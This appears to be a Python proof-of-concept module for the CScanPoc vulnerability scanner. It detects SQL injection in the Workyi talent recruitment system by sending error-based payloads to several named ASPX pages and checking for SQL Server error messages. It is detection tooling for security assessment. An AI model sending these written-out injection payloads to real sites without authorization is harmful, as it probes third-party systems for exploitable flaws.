# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Workyi_0008' # 平台漏洞编号，留空
    name = 'Workyi人才系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-05-27'  # 漏洞公布时间
    desc = '''
        Workyi人才系统 页面参数过滤不严谨，导致SQL注入漏洞。
        /persondh/urgent.aspx?key=%27%20and%20@@version=0;--
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'Workyi人才系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '4060192a-5a95-4150-a5c8-0840fbcc9300'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #ref: http://www.wooyun.org/bugs/wooyun-2010-0120283
            #ref: http://www.wooyun.org/bugs/wooyun-2010-0116472
            #ref: http://www.wooyun.org/bugs/wooyun-2010-0115157
            #ref: http://www.wooyun.org/bugs/wooyun-2010-0115094

            hh = hackhttp.hackhttp()
            #sql injection 1
            # url = arg + 'map/showtag.aspx'
            # postdata = "cenx=&ceny=&cenz=&maxX=&maxY=&minX=-1);%20waitfor%20delay%20'0:0:0'%20--%20&minY=&select1=%e4%bc%81%e4%b8%9a%e5%90%8d&select2=%e5%8c%97%e4%ba%ac&txtJingYan=&txtKey=1&txtLeiXing=&txtXueLi=&txtYueXin="
            # code, head, res, errcode, _ = hh.http(url,post=postdata)
            # if code == 200 and 'select' in res:
            #     security_warning('workyi_system sql injection:http://www.wooyun.org/bugs/wooyun-2010-0120283 %s'%url)

            #sql injection 2
            url = self.target + "/persondh/urgent.aspx?key=%27%20and%20@@version=0;--"
            code, head, res, errcode, _ = hh.http(url)
            if code == 500 and 'SQL Server' in res:
                #security_warning('workyi_system sql injection:http://www.wooyun.org/bugs/wooyun-2010-0116472 %s'%url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))


            #sql injection 3
            sql_injection_3 = 0

            url = self.target + "/companydh/latest.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27%"
            code, head, res, errcode, _ = hh.http(url)
            if code == 500 and 'SQL Server' in res:
                sql_injection_3 = 1
            url = self.target + "/companydh/vip.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27%"
            code, head, res, errcode, _ = hh.http(url)
            if code == 500 and 'SQL Server' in res:
                sql_injection_3 = 1
            url = self.target + "/companydh/recommand.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27%"
            code, head, res, errcode, _ = hh.http(url)
            if code == 500 and 'SQL Server' in res:
                sql_injection_3 = 1
            url = self.target + "/companydh/picture.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27"
            code, head, res, errcode, _ = hh.http(url)
            if code == 500 and 'SQL Server' in res:
                sql_injection_3 = 1
            url = self.target + "/companydh/parttime.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27%"
            code, head, res, errcode, _ = hh.http(url)
            if code == 500 and 'SQL Server' in res:
                sql_injection_3 = 1
            if sql_injection_3 == 1:
                #security_warning('workyi_system sql injection:http://www.wooyun.org/bugs/wooyun-2010-0115157 %s'%url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))


            #sql injection 4
            url = self.target + "/news/search.aspx?key=%27%20and%20@@version=0%20or%20%27%%27=%27%"
            code, head, res, errcode, _ = hh.http(url)
            if code == 500 and 'SQL Server' in res:
                #security_warning('workyi_system sql injection:http://www.wooyun.org/bugs/wooyun-2010-0115094 %s'%url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
